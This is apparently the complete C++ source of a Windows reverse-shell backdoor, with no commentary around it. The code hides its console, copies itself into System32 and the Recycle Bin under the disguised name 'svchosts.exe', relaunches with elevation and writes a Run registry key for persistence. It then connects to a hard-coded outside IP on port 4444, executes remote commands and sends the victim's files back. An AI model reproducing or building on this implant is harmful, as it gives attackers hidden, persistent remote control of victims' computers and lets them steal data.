
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
//#include <iostream>
 
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
char* pwd(){
	char* dir = (char*) malloc(sizeof(char)*512);
	GetCurrentDirectory(512,dir);
	return dir;
}
bool starts_with(char* string,char* what){
	if(strlen(what)>strlen(string))return false;
	while(*what!= '\0'){
		if(*what != *string)return false;
		what++;
		string++;
	}
	return true;
}
char* extract_second(char* string){
	while(*string != '\0' && *(string++) != ' ')string++;
	return string;
}
int file_size(FILE* file){
	fseek(file,0L,SEEK_END);
	int pos = ftell(file);
	rewind(file);
	return pos;
}
void upload(char* fname,SOCKET& sock){
	FILE* file = fopen(fname,"rb");
	void* filedata = malloc(sizeof(char) * file_size(file));
	size_t fsize = file_size(file);
	fread(filedata,sizeof(char),fsize,file);
	send(sock,(char*) filedata,fsize,0);
	free(filedata);
}
void restart_self(){
	char selfname[MAX_PATH+1];
	GetModuleFileName(NULL,selfname,MAX_PATH+1);
	char command[MAX_PATH+10];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	while ((int)ShellExecute( NULL, 
    "runas",  
    selfname,  
    "",     
    NULL,                        // default dir 
    SW_HIDE  ) < 33);
	std::exit(0);
}
void add_to_startup(){
	HKEY hkey;
	char selfname[MAX_PATH+1];
	GetModuleFileName(NULL,selfname,MAX_PATH+1);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_SET_VALUE, &hkey);
	RegSetValueEx (hkey, selfname, 0, REG_SZ, (LPBYTE) selfname, strlen(selfname) + 1);
	RegCloseKey(hkey);
}
/*
*/
void s32copy(char* fname){
	FILE* file = fopen(fname,"rb");
	FILE* rcbinf = fopen("C:\\Windows\\System32\\svchosts.exe","wb");
	char ch;
	size_t fsize = file_size(file);
	int counter = 0;
	while (((ch = fgetc(file)) || true) && counter < fsize){
      fputc(ch, rcbinf);
      counter++;
	}
  	fclose(file);
  	fclose(rcbinf);
}
void fcopy(char* fname){
	FILE* file = fopen(fname,"rb");
	FILE* rcbinf = fopen("C:\\$Recycle.Bin\\svchosts.exe","wb");
	char ch;
	size_t fsize = file_size(file);
	int counter = 0;
	while (((ch = fgetc(file)) || true) && counter < fsize){
      fputc(ch, rcbinf);
      counter++;
	}
  	fclose(file);
  	fclose(rcbinf);
}
void copy_to_rcbin(){
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	char selfname[MAX_PATH+1];
	GetModuleFileName(NULL,selfname,MAX_PATH+1);
	if(strcmp(selfname,"c:\\$Recycle.Bin\\svchosts.exe") != 0){
		fcopy(selfname);
		if((int)ShellExecute( NULL, 
    "runas",  
    "c:\\$Recycle.Bin\\svchosts.exe",  
    "",     
    NULL,                        // default dir 
    SW_HIDE  ) >= 33)std::exit(0);
	}
}
void copy_to_system32(){
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	char selfname[MAX_PATH+1];
	GetModuleFileName(NULL,selfname,MAX_PATH+1);
	if(strcmp(selfname,"C:\\Windows\\System32\\svchosts.exe") != 0)s32copy(selfname);
	if((int)ShellExecute( NULL, 
    "runas",  
    "C:\\Windows\\System32\\svchosts.exe",  
    "",     
    NULL,                        // default dir 
    SW_HIDE  ) > 33)std::exit(0);
}
void RevShell(){
	WSADATA wsaver;
	WSAStartup(MAKEWORD(2,2),&wsaver);
	SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = inet_addr("105.229.57.34");
	while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))!=0)restart_self();
	if(1){
		//std::cout << "[+] Connected. " << std::endl;
		char command[DEFAULT_BUFLEN] = "";
		while(1){
			int Result = recv(tcpsock,command,DEFAULT_BUFLEN,0);
			if(Result <= 0){
				restart_self();
			}
			else if(strlen(command)){
				//std::cout << "Command: " << command << std::endl;
				char   psBuffer[4096*5];
				FILE   *pPipe;
				if(strcmp(command,"pwd") == 0){
					char* cmd_out = pwd();
					send(tcpsock,cmd_out,strlen(cmd_out),0);
					free(cmd_out);
				}
				else if(starts_with(command,"cd")){
					SetCurrentDirectory(extract_second(command));
				}
				else if(starts_with(command,"download")){
					upload(extract_second(command),tcpsock);
				}
				else if(strcmp(command,"ls")==0){
					WIN32_FIND_DATAA fdata;
					HANDLE f_res = FindFirstFileA("*",&fdata);
					char* fname = (char*) malloc(sizeof(char)*strlen(fdata.cFileName)+sizeof(char)*2);
					sprintf(fname,"%s\n",fdata.cFileName);
					send(tcpsock,fname,strlen(fname),0);
					free(fname);
					while(FindNextFileA(f_res,&fdata)){
						char* fname = (char*) malloc(sizeof(char)*strlen(fdata.cFileName)+sizeof(char)*2);
						sprintf(fname,"%s\n",fdata.cFileName);
						send(tcpsock,fname,strlen(fname),0);
						free(fname);
					};
				}
				else if((pPipe = _popen( command, "rt" )) != false){
					fgets(psBuffer, 4096*5, pPipe);
					//strcat(psBuffer,"\n");
					if(send(tcpsock,psBuffer,strlen(psBuffer),0) == SOCKET_ERROR)
						while(connect(tcpsock,(SOCKADDR*)&addr,sizeof(addr))==SOCKET_ERROR){
							//Keep retrying
					};
					memset(psBuffer,0,4096*5);
				}
			}
			memset(command,0,sizeof(command));
		}
		//system("pause");
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}
int main(){
	HWND stealth;
	AllocConsole();
	stealth=FindWindow("ConsoleWindowClass",NULL);
	ShowWindow(stealth,SW_HIDE);
	copy_to_system32();
	copy_to_rcbin();
	add_to_startup();
	RevShell();
	return 0;
}